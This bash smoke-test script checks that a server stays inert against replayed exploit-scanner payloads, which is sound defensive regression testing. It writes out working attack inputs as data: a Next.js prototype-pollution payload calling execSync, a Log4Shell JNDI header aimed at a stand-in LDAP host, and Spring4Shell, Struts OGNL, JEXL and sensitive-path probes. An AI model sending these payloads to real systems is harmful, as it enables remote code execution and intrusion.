#!/bin/bash
#
# SMOKE TEST — Phase 12: Real-World Scanner Regression Corpus
#
# Tests that exploit scanner payloads observed in the wild do not find traction.
# Each test replays a real payload captured from automated exploit scanners and
# confirms the server responds safely (404, inert storage, or no code execution).
#
# Seed corpus: 2026-04-12 incident on demo server
#   - Next.js prototype pollution / Server Actions RCE (CVE-2025-29927 variant)
#   - VMware vSphere SDK SOAP fingerprint
#   - Sonatype Nexus JEXL injection
# Plus well-known historical scanner patterns:
#   - Log4Shell (CVE-2021-44228)
#   - Spring4Shell (CVE-2022-22965)
#   - Apache Struts OGNL (CVE-2017-5638)
#   - PHP / WordPress probes
#   - Generic cgi-bin probes
#
# Add new tests here every time a novel scanner payload is observed in logs.
#
# Total: 10 tests
#

source "$(cd "$(dirname "$0")" && pwd)/smoke-common.sh"

printf "\n${BOLD}${CYAN}═══════════════════════════════════════════════════${RESET}\n"
printf "${BOLD}${CYAN}  PHASE 12: Scanner Regression Corpus${RESET}\n"
printf "${BOLD}${CYAN}═══════════════════════════════════════════════════${RESET}\n\n"

printf "${BOLD}── Phase 12: Real-world scanner payloads ──${RESET}\n"

UPLOAD_PORT=8087

# Helper: remove any scanner test artifacts from incoming after each test
clean_incoming() {
    rm -f "$INCOMING"/upload.scanner-* 2>/dev/null
    rm -f "$INCOMING"/upload._next* 2>/dev/null
    rm -f "$INCOMING"/upload.sdk* 2>/dev/null
    rm -f "$INCOMING"/upload.serviceextdirect* 2>/dev/null
    rm -f "$INCOMING"/scanner-* 2>/dev/null
    rm -f "$INCOMING"/*.meta 2>/dev/null
}

# Helper: check a response body for signs of leaked internals or code execution.
# Returns 0 (safe) if no markers found, 1 (unsafe) if any marker is present.
check_safe_response() {
    local BODY="$1"
    # Markers that would indicate code execution or info leak on the server
    if echo "$BODY" | grep -qE "root:x:|uid=[0-9]+|Linux version|Darwin Kernel|process.mainModule|/bin/bash"; then
        return 1
    fi
    return 0
}

# ─── Upload-side scanner payloads ─────────────────────────
# These are payloads the scanner POSTed as file uploads on 2026-04-12.
# They should be accepted as inert text files (current upload endpoint has no
# auth — see Issue #2) but MUST NOT trigger any interpretation.

if $SMOKE_REMOTE; then
    skip "Upload-side scanner tests (12.1-12.4)" "REMOTE mode — direct port 8087 access not available"
elif ! lsof -ti:$UPLOAD_PORT > /dev/null 2>&1; then
    skip "Upload port $UPLOAD_PORT" "not running — skipping upload-side scanner tests"
else

# 12.1 Next.js Server Actions RCE payload (CVE-2025-29927 variant)
#      Uses $1:__proto__:then prototype pollution + constructor:constructor
#      to try to execute process.mainModule.require('child_process').execSync
test_start "12.1 Next.js proto-pollution RCE"
PAYLOAD_12_1='{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require(\"child_process\").execSync(\"touch /tmp/alt-scanner-12-1-pwned\").toString();","_formData":{"get":"$1:constructor:constructor"}}}'
RESP=$(curl -s --max-time 5 \
    -F "file=@-;filename=scanner-next-proto.txt" \
    "http://localhost:$UPLOAD_PORT/formpost" <<< "$PAYLOAD_12_1" || true)
sleep 1
clean_incoming
if [ -f "/tmp/alt-scanner-12-1-pwned" ]; then
    rm -f /tmp/alt-scanner-12-1-pwned
    fail "12.1 Next.js proto-pollution RCE" "CRITICAL: code executed (marker file created)"
else
    pass "12.1 Next.js proto-pollution RCE — inert (no code execution)"
fi

# 12.2 Canary arithmetic payload (scanner confirms RCE via redirect digest)
#      Variant uses r = X+true+Y; throw NEXT_REDIRECT
test_start "12.2 Next.js canary arithmetic"
PAYLOAD_12_2='{"then":"$1:__proto__:then","_response":{"_prefix":"r = 53386+true+2094331;throw Object.assign(new Error(\"NEXT_REDIRECT\"),{digest:`${r}`});"}}'
RESP=$(curl -s --max-time 5 \
    -F "file=@-;filename=scanner-next-canary.txt" \
    "http://localhost:$UPLOAD_PORT/formpost" <<< "$PAYLOAD_12_2" || true)
clean_incoming
# The canary value is 53386 + 1 + 2094331 = 2147718. Response must not contain it in a digest header.
if echo "$RESP" | grep -q "2147718"; then
    fail "12.2 Next.js canary arithmetic" "CRITICAL: canary echoed in response (possible RCE confirmation)"
else
    pass "12.2 Next.js canary arithmetic — not echoed"
fi

# 12.3 VMware vSphere SOAP probe (RetrieveServiceContent)
test_start "12.3 vSphere SOAP RetrieveServiceContent — inert"
PAYLOAD_12_3='<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><RetrieveServiceContent xmlns="urn:internalvim25"><_this xsi:type="ManagedObjectReference" type="ServiceInstance">ServiceInstance</_this></RetrieveServiceContent></soap:Body></soap:Envelope>'
RESP=$(curl -s --max-time 5 \
    -F "file=@-;filename=scanner-sdk.xml" \
    "http://localhost:$UPLOAD_PORT/formpost" <<< "$PAYLOAD_12_3" || true)
clean_incoming
if check_safe_response "$RESP"; then
    pass "12.3 vSphere SOAP RetrieveServiceContent — inert"
else
    fail "12.3 vSphere SOAP" "response contains execution markers"
fi

# 12.4 Sonatype Nexus JEXL injection probe
test_start "12.4 Nexus JEXL injection — inert"
PAYLOAD_12_4='{"action":"coreui_Component","data":[{"filter":[{"property":"repositoryName","value":"*"},{"property":"expression","value":"1==1"},{"property":"type","value":"jexl"}],"limit":50,"page":1}],"method":"previewAssets","tid":18,"type":"rpc"}'
RESP=$(curl -s --max-time 5 \
    -F "file=@-;filename=scanner-nexus-jexl.json" \
    "http://localhost:$UPLOAD_PORT/formpost" <<< "$PAYLOAD_12_4" || true)
clean_incoming
if check_safe_response "$RESP"; then
    pass "12.4 Nexus JEXL injection — inert"
else
    fail "12.4 Nexus JEXL" "response contains execution markers"
fi

fi  # upload port check

# ─── URL-path scanner probes ──────────────────────────────
# Scanners probe well-known vulnerable paths. Alterante doesn't expose any of
# these endpoints; all must return 404 (or empty, for unauth endpoints).

# 12.5 Log4Shell JNDI injection via User-Agent header
#      If Alterante logs User-Agent with any Log4j-vulnerable logger, this would
#      trigger outbound LDAP. Our logger is println-based, but test anyway.
test_start "12.5 Log4Shell JNDI"
RESP=$(curl -s --max-time 5 \
    -H 'User-Agent: ${jndi:ldap://alt-scanner-canary.invalid/a}' \
    "$SERVER/cass/getsession.fn" || true)
# We don't try to detect outbound DNS. Just confirm the server doesn't crash
# and response doesn't leak the payload back into logs visible in body.
if echo "$RESP" | grep -q "jndi:ldap"; then
    fail "12.5 Log4Shell JNDI" "payload reflected in response body"
else
    pass "12.5 Log4Shell JNDI — no reflection, no crash"
fi

# 12.6 Spring4Shell class.module.classLoader probe
test_start "12.6 Spring4Shell classLoader probe"
STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 \
    "$SERVER/cass/anything.fn?class.module.classLoader.resources.context.parent.pipeline.first.pattern=test" || true)
# Should be 200 (parameter ignored) or 404 — but NOT 500.
if [ "$STATUS" = "500" ]; then
    fail "12.6 Spring4Shell classLoader probe" "server returned 500 (parameter caused error)"
else
    pass "12.6 Spring4Shell classLoader probe — HTTP $STATUS"
fi

# 12.7 Apache Struts OGNL injection probe
#      000 = server closed connection without HTTP response (also safe — nothing served)
test_start "12.7 Struts OGNL probe — HTTP"
STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 \
    "$SERVER/struts2-showcase.action?message=%25%7B%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%7D" || true)
if [ "$STATUS" = "404" ] || [ "$STATUS" = "400" ] || [ "$STATUS" = "000" ]; then
    pass "12.7 Struts OGNL probe — HTTP $STATUS (not served)"
elif [ "$STATUS" = "500" ]; then
    fail "12.7 Struts OGNL probe" "server returned 500 — OGNL may have triggered error"
else
    fail "12.7 Struts OGNL probe" "unexpected HTTP $STATUS"
fi

# Verify server still alive after the probe
ALIVE=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 "$SERVER/cass/getsession.fn" || true)
if [ "$ALIVE" != "200" ]; then
    fail "12.7 Struts OGNL — server health after probe" "getsession.fn returned HTTP $ALIVE"
fi

# 12.8 PHP / WordPress probes (common scanner footprint)
test_start "12.8 PHP/WordPress probes — all 404/400"
FAIL_PATHS=""
for PATH_PROBE in "/wp-login.php" "/wp-admin/setup-config.php" "/?=phpinfo()" "/phpmyadmin/" "/.env"; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 "$SERVER$PATH_PROBE" || true)
    if [ "$STATUS" = "200" ]; then
        # 200 is suspicious — these paths should 404
        FAIL_PATHS="$FAIL_PATHS $PATH_PROBE(HTTP$STATUS)"
    fi
done
if [ -z "$FAIL_PATHS" ]; then
    pass "12.8 PHP/WordPress probes — all 404/400"
else
    fail "12.8 PHP/WordPress probes" "served 200 for:$FAIL_PATHS"
fi

# 12.9 Generic cgi-bin / admin panel probes
test_start "12.9 cgi-bin/admin-panel probes — all 404/400"
FAIL_PATHS=""
for PATH_PROBE in "/cgi-bin/test.sh" "/manager/html" "/admin.php" "/actuator/env" "/.git/config"; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 "$SERVER$PATH_PROBE" || true)
    if [ "$STATUS" = "200" ]; then
        FAIL_PATHS="$FAIL_PATHS $PATH_PROBE(HTTP$STATUS)"
    fi
done
if [ -z "$FAIL_PATHS" ]; then
    pass "12.9 cgi-bin/admin-panel probes — all 404/400"
else
    fail "12.9 cgi-bin/admin-panel probes" "served 200 for:$FAIL_PATHS"
fi

# 12.10 Server-alive sanity check — after all scanner payloads, server must still respond
test_start "12.10 server alive after scanner corpus"
STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "$SERVER/cass/getsession.fn" || true)
if [ "$STATUS" = "200" ]; then
    pass "12.10 server alive after scanner corpus"
else
    fail "12.10 server alive after scanner corpus" "getsession.fn returned HTTP $STATUS"
fi

# ─── SUMMARY ──────────────────────────────────────────────

print_summary "PHASE 12"
